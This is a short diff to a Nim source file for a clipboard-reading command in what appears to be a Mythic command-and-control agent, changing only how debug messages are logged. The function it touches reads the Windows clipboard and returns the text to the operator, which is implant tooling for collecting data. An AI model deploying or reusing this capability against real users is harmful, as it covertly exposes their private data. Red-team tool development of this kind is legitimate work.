@@ -1,5 +1,5 @@
-import ../config
 import ../utils/mythic_responses
+import ../utils/debug
 import std/json
 
 when defined(windows):
@@ -7,8 +7,6 @@ when defined(windows):
 
 proc clipboard*(taskId: string, params: JsonNode): JsonNode =
   ## Get the current clipboard contents (Windows only)
-  let cfg = getConfig()
-  
   when defined(windows):
     try:
       # Open the clipboard
@@ -39,8 +37,7 @@ proc clipboard*(taskId: string, params: JsonNode): JsonNode =
       discard GlobalUnlock(hClipboardData)
       CloseClipboard()
       
-      if cfg.debug:
-        echo "[DEBUG] Retrieved clipboard content (", clipboardText.len, " characters)"
+      debug &"[DEBUG] Retrieved clipboard content ({clipboardText.len} characters)"
       
       return mythicSuccess(taskId, clipboardText)
       
